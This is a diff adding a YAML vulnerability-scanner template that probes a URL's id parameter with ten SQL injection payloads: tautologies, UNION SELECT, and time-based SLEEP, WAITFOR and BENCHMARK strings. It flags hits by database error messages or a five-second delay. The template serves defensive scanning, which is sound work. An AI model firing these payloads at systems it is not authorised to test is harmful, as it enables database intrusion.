@@ -1,0 +1,103 @@
+id: sql-injection-detection
+
+info:
+  name: SQL Injection Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects potential SQL injection vulnerabilities by sending various payloads and checking for database error messages or behavioral changes.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    max-request: 10
+  tags: sqli,injection,vulnerability,generic
+
+http:
+  - raw:
+      - |
+        GET /?id={{sqli}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    payloads:
+      sqli:
+        - "1'"
+        - "1' OR '1'='1"
+        - "1\" OR \"1\"=\"1"
+        - "1' AND 1=1 -- -"
+        - "1' AND 1=2 -- -"
+        - "1' UNION SELECT NULL -- -"
+        - "1' WAITFOR DELAY '0:0:5' -- -"
+        - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- -"
+        - "1' AND SLEEP(5) -- -"
+        - "1' AND BENCHMARK(10000000,MD5('a')) -- -"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        name: mysql-error
+        words:
+          - "You have an error in your SQL syntax"
+          - "Warning: mysql_fetch_array()"
+          - "MySqlException"
+          - "MySQL Query fail"
+        condition: or
+        part: body
+
+      - type: word
+        name: mssql-error
+        words:
+          - "Microsoft SQL Native Client error"
+          - "ODBC SQL Server Driver"
+          - "SQLServer JDBC Driver"
+          - "SqlException"
+          - "System.Data.SqlClient"
+          - "Unclosed quotation mark after the character string"
+          - "Incorrect syntax near"
+        condition: or
+        part: body
+
+      - type: word
+        name: oracle-error
+        words:
+          - "ORA-00933"
+          - "ORA-01756"
+          - "ORA-01758"
+          - "ORA-01761"
+          - "ORA-01789"
+          - "ORA-12154"
+          - "OracleException"
+        condition: or
+        part: body
+
+      - type: word
+        name: postgresql-error
+        words:
+          - "PostgreSQL query failed"
+          - "PSQLException"
+          - "ERROR: syntax error at or near"
+          - "ERROR: unterminated quoted string at or near"
+        condition: or
+        part: body
+
+      - type: word
+        name: sqlite-error
+        words:
+          - "SQLite/JDBCDriver"
+          - "SQLite.Exception"
+          - "System.Data.SQLite.SQLiteException"
+          - "sqlite3.OperationalError"
+        condition: or
+        part: body
+
+      - type: dsl
+        name: time-based-detection
+        dsl:
+          - "duration>=5"
+        condition: and
